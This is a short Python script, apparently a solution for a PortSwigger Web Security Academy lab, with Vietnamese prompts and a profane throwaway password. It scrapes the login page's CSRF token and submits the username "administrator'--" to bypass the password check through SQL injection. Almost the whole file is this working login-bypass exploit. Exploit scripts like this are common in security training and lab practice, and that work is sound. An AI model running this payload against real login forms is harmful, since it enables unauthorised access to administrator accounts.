#SQL injection vulnerability allowing login bypass
import requests
from bs4 import BeautifulSoup

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")
login_url = base_url + "/login"

session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,
    "username": "administrator'--",
    "password": "ditmemay"
}

response = session.post(login_url, data=data)
if (response.status_code == 200):
    print("Ngon")
else:
    print("Thua")
